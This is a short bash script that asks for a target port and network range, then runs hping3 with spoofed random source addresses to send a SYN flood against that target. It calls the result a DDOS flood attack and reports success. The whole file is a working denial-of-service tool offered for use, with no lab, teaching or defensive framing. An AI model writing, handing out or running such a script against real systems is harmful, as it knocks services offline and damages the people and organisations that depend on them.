#!/bin/bash

echo -n "Please specify port numbers to perform an attack: "; read port
echo "Port range acquired successfully."
echo -n "Please enter a network range to perform an attack: "; read ip
echo "Network range acquired successfully."
echo "Attempting flood attack on: " $ip; echo "Port: " $port
sudo hping3 --rand-source $ip -c 30000 -S --flood -p $port
echo "DDOS flood attack performed successfully."


